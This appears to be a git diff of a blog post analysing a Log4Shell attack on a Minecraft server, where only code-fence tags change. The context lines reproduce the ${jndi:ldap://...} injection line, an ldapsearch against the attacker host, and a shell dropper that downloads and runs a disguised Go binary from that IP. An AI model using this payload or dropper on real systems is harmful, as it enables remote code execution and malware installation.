@@ -20,7 +20,7 @@ Tracing the timeline of this exploit yields some fascinating discussion, but let
 
 The attack occurred this morning at 4:53 AM UTC. Here's what it looked like in the console:
 
-```
+```plaintext
 [4:53:39 AM] [INFO] UUID of player FermatSleep is 9abd3b4d-a8cd-4290-acc5-303c74da3e3f
 [4:53:39 AM] [INFO] FermatSleep[/195.154.52.77:51192] logged in with entity id 1092165 at ([world]114.5, 72.0, -37.5)
 [4:53:41 AM] [INFO] FermatSleep: ${jndi:ldap://195.154.52.77:1389/a}
@@ -29,7 +29,7 @@ The attack occurred this morning at 4:53 AM UTC. Here's what it looked like in t
 
 According to [AbuseIPDB](https://www.abuseipdb.com/check/195.154.52.77), this particular host has been scanning for servers to attack for about two days now. A quick IP-to-ASN lookup reveals that the attack was launched from an IP belonging to AS12876, so one of [Scaleway](https://www.scaleway.com/en/)'s servers. We can use [ldapsearch](https://github.com/bindle/ldap-utils) to simulate the request that this message would have triggered.
 
-```
+```plaintext
 $ ldapsearch -x -H ldap://195.154.52.77:1389/a
 # extended LDIF
 #
@@ -130,7 +130,7 @@ public class Exploit {
 
 Essentially, this payload tries to execute some commands on the target machine:
 
-```
+```bash
 url=http://195.154.52.77:8000/mc_server.jar;remote_ip=195.154.52.77;
 port=$(wget -O- http://$remote_ip:8000/port 2>/dev/null) ;[ $? -ne 0 ] && port=$(curl http://$remote_ip:8000/port 2>/dev/null) ;
 wget --no-check-certificate $url > /dev/null 2>&1 || curl -k -O $url > /dev/null 2>&1 ;
@@ -140,14 +140,14 @@ nohup ./mc_server.jar -b $port > /dev/null 2>&1 &cmd=\"$(pwd)/mc_server.jar -b $
 
 Needless to say, this is not how you run a Minecraft server. The script downloads a binary payload and then dynamically retrieves which port to phone home on from an endpoint called `http://195.154.52.77:8000/port`, which at the time of writing is 31463. (Looking at the headers set on the response from that endpoint also revealed that the server is powered by [simplehttp](https://github.com/bitly/simplehttp) 0.6, running on Python 3.8.10). This port is then passed to the payload, which is saved to a file called "mc_server.jar" to avoid arousing suspicion but is actually written in Go.
 
-```
+```plaintext
 $ file mc_server.jar
 mc_server.jar: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=ojJR3xcBkteWK4xWptDc/hF_tAQVMNfAbpoZ4Kkik/2jwNMERfF4KTuAdVK_0q/BkcBVr6Mnr8QyxLTfPDi, stripped
 ```
 
 Running `strings` on the payload also reveals a wealth of interesting information, such as the name of the malware author and his RSA pubkey.
 
-```
+```plaintext
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOjnUF/J249WuSeaDSlEnOeP1n/75iHQxRK8xjuB1J0FWTATtZcmBjtsGFX6nvv0vkS3kkhp7+Ba+B0GurEK+hdsPYvqMAPydq02iuPojsKOrDuVaPAox+kbmNTR3NEZ/rfd7OYzYNoK+mA/wqJl8K5+BaxUlXbNkKaO5IUbKP2XxLHz4IxRfNEAtl1iscTi0ckdrs4ZNK+PSKE+/Q0seOicuTlkRViP+M1G67mOi9Q12khrRlXwR0nsYuNFc73jWNH2oKoCllUqPHcHsfspvFZ56XzgTx3tZG1L57kfQCF6ErpbTyG8C0ov0rNm7fbcH8sRjYglnA1qc8mV1gVPc8VOZZp+0vvaA+Kv2ZEmMSbhyORC/HM8uCYGbZ8oW1jxZKaSpVasVT8UsbR5bHKM67xXsgZrIvXLGzIDu7QAe3VL1rm7MMe25K10kSkWi6ZuH1UVSuNw+y75igRxOHIox9PElUvVnVTEgIpHTjirY0g/PNmaQ6BlPuRvRFJF3SIKOy5gsZbATj7jhhI5Hj3LvioRwgYe1f0rnn0/Yx7r9tAq5edVk9rkLCUcWh8lbGoZ4Vr/qTYMn4dMPCr78oQ3nX/W6PuDdH8Dxmulq9alrotNcGaznnxnaOixZOCaRKbrMGLje+tXMTSvIJ8aN7Z+puvkIBE4fxMBt2GznN9Whg0Q== rafael@rafael-acer
 ```
 
